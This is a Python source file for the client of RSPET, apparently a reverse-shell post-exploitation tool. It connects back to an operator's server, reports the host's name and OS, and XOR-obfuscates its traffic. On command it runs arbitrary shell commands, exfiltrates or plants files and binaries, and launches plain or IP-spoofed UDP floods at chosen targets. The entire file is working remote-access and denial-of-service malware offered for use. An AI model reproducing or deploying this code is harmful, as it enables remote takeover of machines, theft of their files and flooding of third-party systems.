#!/usr/bin/env python2
# -*- coding: <UTF-8> -*-
"""rspet_client.py: RSPET's Client-side script."""
from __future__ import print_function
from sys import exit as sysexit, argv
from time import sleep
from subprocess import Popen, PIPE
from multiprocessing import Process, freeze_support
from socket import socket, IPPROTO_UDP, IPPROTO_RAW, SOCK_DGRAM, SOCK_STREAM, SOCK_RAW, AF_INET
from socket import error as sock_error
from pinject import UDP, IP

__author__ = "Kolokotronis Panagiotis"
__copyright__ = "Copyright 2016, Kolokotronis Panagiotis"
__credits__ = ["Kolokotronis Panagiotis", "Dimitris Zervas", "Lain Iwakura"]
__license__ = "MIT"
__version__ = "0.2.7"
__maintainer__ = "Kolokotronis Panagiotis"


def exponential_backoff(c_factor):
    """Calculate backoff time for reconnect."""
    return int(((2**c_factor)-1)/2)


def sys_info():
    import platform
    sys_info_tup = platform.uname()
    return (sys_info_tup[0], sys_info_tup[1])


def get_len(in_string, max_len):
    """Calculate string length, return as a string with trailing 0s.

    Keyword argument(s):
    in_string -- input string
    max_len   -- length of returned string
    """
    tmp_str = str(len(in_string))
    len_to_return = tmp_str
    for _ in range(max_len - len(tmp_str)):
        len_to_return = '0' + len_to_return
    return len_to_return


def obf_deobf(byte_array):
    """Obfuscate/Deobfuscate message."""
    for i, val in enumerate(byte_array):
        byte_array[i] = val ^ 0x41
    return byte_array


def make_en_stdout(stdout):
    """Obfuscate (xor) and return string.

    Keyword argument(s):
    stdout -- string to be sent
    """
    en_stdout = bytearray(stdout, 'UTF-8')
    return obf_deobf(en_stdout)
    #for i in range(len(en_stdout)):
    #    en_stdout[i] = en_stdout[i] ^ 0x41
    #return en_stdout


def make_en_bin_stdout(stdout):
    """Obfuscate (xor) and return binary.

    Keyword argument(s):
    stdout -- binary to be sent
    """
    en_stdout = bytearray(stdout)
    return obf_deobf(en_stdout)
    #for i in range(len(en_stdout)):
    #    en_stdout[i] = en_stdout[i] ^ 0x41
    #return en_stdout


def make_en_data(data):
    """Deobfuscate (xor) data, return string."""
    en_data = bytearray(data)
    return obf_deobf(en_data)
    #for i in range(len(en_data)):
    #    en_data[i] = en_data[i] ^ 0x41
    #return en_data


def udp_flood_start(target_ip, target_port, msg):
    """Create UDP packet and send it to target_ip, target_port."""
    flood_sock = socket(AF_INET, SOCK_DGRAM)
    while True:
        flood_sock.sendto(bytes(msg), (target_ip, target_port))
        sleep(0.01)


def udp_spoof_pck(dest_ip, dest_port, source_ip, source_port, payload):
    """Create and return a spoofed UDP packet.

    Keyword argument(s):
    dest_ip -- the desired destination ip
    dest_port -- the desired destination port
    source_ip -- the desired source ip
    source_port -- the desired source port
    """
    udp_header = UDP(source_port, dest_port, payload).pack(source_ip, dest_ip)
    ip_header = IP(source_ip, dest_ip, udp_header, IPPROTO_UDP).pack()
    return ip_header+udp_header+payload


def udp_spoof_start(target_ip, target_port, spoofed_ip, spoofed_port, payload):
    """Spoof a packet and send it to target_ip, target_port.

    Keyword argument(s):
    target_ip -- the desired destination ip
    target_port -- the desired destination port
    spoofed_ip -- the desired source ip
    spoofed_port -- the desired source port
    """
    spoofed_packet = udp_spoof_pck(target_ip, target_port, spoofed_ip,
                                   spoofed_port, payload)
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)
    while True:
        sock.sendto(spoofed_packet, (target_ip, target_port))
        sleep(0.01)


class Client(object):
    """Class for Client."""
    def __init__(self, addr, port=9000):
        self.sock = socket(AF_INET, SOCK_STREAM)
        self.address = addr
        self.port = port
        self.quit_signal = False
        self.version = ("%s-%s" %(__version__, "full"))
        self.comm_dict = {
            '00000' : 'killMe',
            '00001' : 'getFile',
            '00002' : 'getBinary',
            '00003' : 'sendFile',
            '00004' : 'sendBinary',
            '00005' : 'udpFlood',
            '00006' : 'udpSpoof',
            '00007' : 'command',
            '00008' : 'KILL'
        }
        self.comm_swtch = {
            'killMe'    : self.kill_me,
            'getFile'   : self.get_file,
            'getBinary' : self.get_binary,
            'sendFile'  : self.send_file,
            'sendBinary': self.send_binary,
            'udpFlood'  : self.udp_flood,
            'udpSpoof'  : self.udp_spoof,
            'command'   : self.run_cm
        }

    def loop(self):
        """Client's main body. Accept and execute commands."""
        while not self.quit_signal:
            en_data = self.get_en_data(5)
            try:
                en_data = self.comm_dict[en_data]
            except KeyError:
                continue
            self.comm_swtch[en_data]()
        self.sock.close()

    def connect(self):
        """Connect to the Server."""
        try:
            self.sock.connect((self.address, self.port))
            ###Send Version###
            msg_len = get_len(self.version,2) # len is 2-digit (i.e. up to 99 chars)
            en_stdout = make_en_stdout(msg_len)
            en_stdout = self.send(en_stdout)
            en_stdout = make_en_stdout(self.version)
            en_stdout = self.send(en_stdout)
            ##################
            sys_type, sys_hname = sys_info()
            ###Send System Type###
            msg_len = get_len(sys_type,2) # len is 2-digit (i.e. up to 99 chars)
            en_stdout = make_en_stdout(msg_len)
            en_stdout = self.send(en_stdout)
            en_stdout = make_en_stdout(sys_type)
            en_stdout = self.send(en_stdout)
            ######################
            ###Send Hostname###
            if sys_hname == "":
                sys_hname = "None"
            msg_len = get_len(sys_hname,2) # len is 2-digit (i.e. up to 99 chars)
            en_stdout = make_en_stdout(msg_len)
            en_stdout = self.send(en_stdout)
            en_stdout = make_en_stdout(sys_hname)
            en_stdout = self.send(en_stdout)
            ###################
        except sock_error:
            raise sock_error
        return 0

    def reconnect(self):
        """Attempt to reconnect after connection loss."""
        # Take an exponential backoff-ish approach
        c_factor = 0
        connected = False
        while not connected:
            try:
                self.connect()
            except sock_error:
                exponential_backoff(c_factor)
                c_factor += 1
            else:
                connected = True

    def send(self, data):
        """Send message to Server."""
        r_code = 0
        try:
            self.sock.send(data)
        except sock_error:
            r_code = 1
            self.reconnect()
        return r_code

    def get_en_data(self, size):
        """Get data, return string."""
        data = self.sock.recv(size)
        return make_en_data(data).decode('UTF-8')

    def get_en_bin_data(self, size):
        """Get data, return binary."""
        data = self.sock.recv(size)
        return make_en_data(data)

    def kill_me(self):
        """Close socket, terminate script's execution."""
        self.quit_signal = True

    def run_cm(self):
        """Get command to run from server, execute it and send results back."""
        en_data = self.get_en_data(13)
        en_data = self.get_en_data(int(en_data))
        comm = Popen(en_data, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
        stdout, stderr = comm.communicate()
        if stderr:
            decode = stderr.decode('UTF-8')
        elif stdout:
            decode = stdout.decode('UTF-8')
        else:
            decode = 'Command has no output'
        len_decode = get_len(decode, 13)
        en_stdout = make_en_stdout(len_decode)
        en_stdout = self.send(en_stdout)
        if en_stdout == 0:
            en_stdout = make_en_stdout(decode)
            en_stdout = self.send(en_stdout)
        return 0

    def get_file(self):
        """Get file name and contents from server, create file."""
        exit_code = 0
        en_data = self.get_en_data(3) #Filename length up to 999 chars
        en_data = self.get_en_data(int(en_data))
        try:
            file_to_write = open(en_data, 'w')
            stdout = 'fcs'
        except IOError:
            stdout = 'fna'
            exit_code = 1
            en_stdout = make_en_stdout(stdout)
            en_stdout = self.send(en_stdout)
        else:
            en_stdout = make_en_stdout(stdout)
            en_stdout = self.send(en_stdout)
            if en_stdout == 0:
                f_size = self.get_en_data(13) #File size up to 9999999999999 chars
                en_data = self.get_en_data(int(f_size))
                file_to_write.write(en_data)
                file_to_write.close()
                stdout = "fsw"
                en_stdout = make_en_stdout(stdout)
                en_stdout = self.send(en_stdout)
            else:
                file_to_write.close()
        return exit_code

    def get_binary(self):
        """Get binary name and contents from server, create binary."""
        exit_code = 0
        en_data = self.get_en_data(3) #Filename length up to 999 chars
        en_data = self.get_en_data(int(en_data))
        try:
            bin_to_write = open(en_data, 'wb')
            stdout = 'fcs'
        except IOError:
            stdout = 'fna'
            exit_code = 1
            en_stdout = make_en_stdout(stdout)
            en_stdout = self.send(en_stdout)
        else:
            en_stdout = make_en_stdout(stdout)
            en_stdout = self.send(en_stdout)
            if en_stdout == 0:
                b_size = self.get_en_data(13) #Binary size up to 9999999999999 symbols
                en_data = self.get_en_bin_data(int(b_size))
                bin_to_write.write(en_data)
                bin_to_write.close()
                stdout = "fsw"
                en_stdout = make_en_stdout(stdout)
                en_stdout = self.send(en_stdout)
            else:
                bin_to_write.close()
        return exit_code

    def send_file(self):
        """Get file name from server, send contents back."""
        exit_code = 0
        en_data = self.get_en_data(3) #Filename length up to 999 chars
        en_data = self.get_en_data(int(en_data))
        try:
            file_to_send = open(en_data, 'r')
            stdout = 'fos'
        except IOError:
            stdout = 'fna'
            exit_code = 1
            en_stdout = make_en_stdout(stdout)
            en_stdout = self.send(en_stdout)
        else:
            en_stdout = make_en_stdout(stdout)
            en_stdout = self.send(en_stdout)
            if en_stdout == 0:
                file_cont = file_to_send.read()
                file_to_send.close()
                stdout = get_len(file_cont, 13)
                en_stdout = make_en_stdout(stdout)
                en_stdout = self.send(en_stdout)
                if en_stdout == 0:
                    stdout = file_cont
                    en_stdout = make_en_stdout(stdout)
                    en_stdout = self.send(en_stdout)
            else:
                file_to_send.close()
        return exit_code

    def send_binary(self):
        """Get binary name from server, send contents back."""
        exit_code = 0
        en_data = self.get_en_data(3) #Filename length up to 999 chars
        en_data = self.get_en_data(int(en_data))
        try:
            bin_to_send = open(en_data, 'rb')
            stdout = 'fos'
        except IOError:
            stdout = 'fna'
            exit_code = 1
            en_stdout = make_en_stdout(stdout)
            en_stdout = self.send(en_stdout)
        else:
            en_stdout = make_en_stdout(stdout)
            en_stdout = self.send(en_stdout)
            if en_stdout == 0:
                bin_cont = bin_to_send.read()
                bin_to_send.close()
                stdout = get_len(bin_cont, 13)
                en_stdout = make_en_stdout(stdout)
                en_stdout = self.send(en_stdout)
                if en_stdout == 0:
                    stdout = bin_cont
                    en_stdout = make_en_bin_stdout(stdout)
                    en_stdout = self.send(en_stdout)
            else:
                bin_to_send.close()
        return exit_code

    def udp_flood(self):
        """Get target ip and port from server, start UPD flood wait for 'KILL'."""
        en_data = self.get_en_data(3) # Max ip+port+payload length 999 chars
        en_data = self.get_en_data(int(en_data))
        en_data = en_data.split(":")
        target_ip = en_data[0]
        target_port = int(en_data[1])
        msg = en_data[2]
        proc = Process(target=udp_flood_start, args=(target_ip, target_port, msg))
        proc.start()
        killed = False
        while not killed:
            en_data = self.get_en_data(5)
            try:
                en_data = self.comm_dict[en_data]
            except KeyError:
                continue
            if en_data == 'KILL':
                proc.terminate()
                killed = True
        return 0

    def udp_spoof(self):
        """Get target/spoofed ip and port from server, start UPD spoof wait for 'KILL'."""
        en_data = self.get_en_data(3)
        en_data = self.get_en_data(int(en_data))
        en_data = en_data.split(":")
        target_ip = en_data[0]
        target_port = int(en_data[1])
        spoofed_ip = en_data[2]
        spoofed_port = int(en_data[3])
        payload = en_data[4].encode('UTF-8')
        proc = Process(target=udp_spoof_start, args=(target_ip, target_port,
                                                     spoofed_ip, spoofed_port,
                                                     payload))
        proc.start()
        killed = False
        while not killed:
            en_data = self.get_en_data(5)
            try:
                en_data = self.comm_dict[en_data]
            except KeyError:
                continue
            if en_data == 'KILL':
                proc.terminate()
                killed = True
        return 0


def main():
    """Main function. Handle object instances."""
    try:
        rhost = argv[1]
    except IndexError:
        print ("Must provide hotst")
        sysexit()
    try:
        myself = Client(rhost, argv[2])
    except IndexError:
        myself = Client(rhost)
    myself.connect()
    myself.loop()


#Start Here!
if __name__ == '__main__':
    freeze_support()
    Process(target=main).start()
